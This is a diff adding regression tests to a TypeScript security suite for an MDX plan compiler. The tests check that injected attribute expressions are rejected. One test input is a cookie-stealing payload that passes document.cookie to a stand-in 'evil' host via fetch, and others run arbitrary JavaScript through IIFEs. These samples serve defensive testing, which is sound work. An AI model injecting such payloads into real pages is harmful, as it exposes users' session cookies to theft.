@@ -155,10 +155,61 @@ describe("mdx-plan security model", () => {
     await expect(compilePlanMdx("# hi\n\nvalue: {globalThis.location}")).rejects.toThrow();
   });
 
+  // B1 regression: attribute-value expressions compile to executable JS and are
+  // NOT reached by the body-node walk. Each of these must be rejected at compile,
+  // or a `.mdx` opened in the preview panel runs arbitrary browser JS.
+  it.each([
+    ["sequence expression", '<Code language="ts" code={((globalThis.__pwned = true), "x")} />'],
+    [
+      "IIFE",
+      '<Code language="ts" code={(function(){ globalThis.__pwned2 = true; return "y" })()} />',
+    ],
+    ["fetch call", "<Code language=\"ts\" code={fetch('https://evil/' + document.cookie)} />"],
+    ["member access", '<Code language="ts" code={window.location.href} />'],
+    ["arrow function", '<Code language="ts" code={(() => globalThis.x)()} />'],
+  ])("rejects non-literal attribute expression: %s", async (_label, source) => {
+    await expect(compilePlanMdx(source)).rejects.toThrow();
+  });
+
+  it("still compiles legitimate JSON-literal attribute expressions on real blocks", async () => {
+    const source = [
+      '<DataModel entities={[{ "id": "user", "name": "User", "fields": [{ "name": "id", "pk": true }] }]} />',
+      "",
+      '<Diagram data={{ "nodes": [{ "id": "a", "label": "A" }], "edges": [] }} />',
+      "",
+      '<Code language="ts" code={"export const x = 1"} maxLines={12} />',
+      "",
+      "<QuestionForm questions={[]} />",
+    ].join("\n");
+    const Content = await compilePlanMdx(source);
+    const html = renderToStaticMarkup(
+      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
+    );
+    expect(html).toContain('data-plan-block-type="data-model"');
+    expect(html).toContain('data-plan-block-type="diagram"');
+    expect(html).toContain("export const x = 1");
+  });
+
   it("rejects unknown components (not in the closed registry)", async () => {
     const Content = await compilePlanMdx("<Malicious onClick={1} />");
     expect(() =>
       renderToStaticMarkup(createElement(Content, { components: PLAN_BLOCK_COMPONENTS })),
     ).toThrow();
+  });
+
+  // S1 regression: an un-id'd block must NOT emit `data-plan-block-id=""` — the
+  // empty attr defeats the `assignBlockIds` fallback and collides every un-id'd
+  // block onto the first `[data-plan-block-id=""]` match.
+  it("omits data-plan-block-id when the author gives no id", async () => {
+    const source = [
+      '<Code language="ts" code={"const a = 1"} />',
+      "",
+      '<Code language="ts" code={"const b = 2"} />',
+    ].join("\n");
+    const Content = await compilePlanMdx(source);
+    const html = renderToStaticMarkup(
+      createElement(Content, { components: PLAN_BLOCK_COMPONENTS }),
+    );
+    expect(html).not.toContain('data-plan-block-id=""');
   });
 });
